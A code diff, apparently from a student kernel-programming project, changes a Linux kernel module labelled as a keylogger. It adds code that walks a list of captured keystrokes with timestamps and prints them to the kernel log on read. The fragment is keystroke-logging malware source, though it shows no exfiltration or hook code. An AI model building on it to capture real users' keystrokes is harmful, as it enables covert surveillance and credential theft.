@@ -6,27 +6,44 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("stmartin");
 MODULE_DESCRIPTION("Module keylog");
 
-static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset);
-static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset);
-
 t_keylst	*k_lst = NULL;
 
-static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
+void		display_list_element(t_keylst *node)
 {
-	printk(KERN_INFO "in key_write\n");
-	return 1;
+	char	message[128] = {0};
+
+	sprintf(message, "(%ld:%ld:%ld) ", (node->time.tv_sec / 3600) % 24, \
+			(node->time.tv_sec / 60) % 60, node->time.tv_sec % 60);
+	strcat(message, node->name);
+	printk(KERN_INFO "[%s]\n", message);
+}
+
+int		browse_linked_list(t_keylst *lst)
+{
+	t_keylst	*tmp;
+
+	if (!k_lst)
+		return 1;
+	tmp = k_lst;
+	while (tmp)
+	{
+		display_list_element(tmp);
+		tmp = tmp->next;
+	}
+	return 0;
 }
 
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
 	printk(KERN_INFO "keylogger: in read\n");
+	if (browse_linked_list(k_lst))
+		return 1;
 	return 0;
 }
 
 static struct file_operations	key_ops = {
 
 	.owner = THIS_MODULE,
-	.write = key_write,
 	.read = key_read
 };
 
@@ -53,7 +70,7 @@ t_keylst		*init_node(t_keylst *node, unsigned char scancode)
 	strcpy(node->name, keyboard_name[scancode & KBD_SCANCODE_MASK]);
 	getnstimeofday(&(node->time));
 	node->next = NULL;
-	printk(KERN_INFO "key [%d] state [%d] name [%s] time [%ld]\n", node->key, node->state, node->name, node->time.tv_sec);
+//	printk(KERN_INFO "key [%d] state [%d] name [%s] time [%ld]\n", node->key, node->state, node->name, node->time.tv_sec);
 	return node;
 }
 
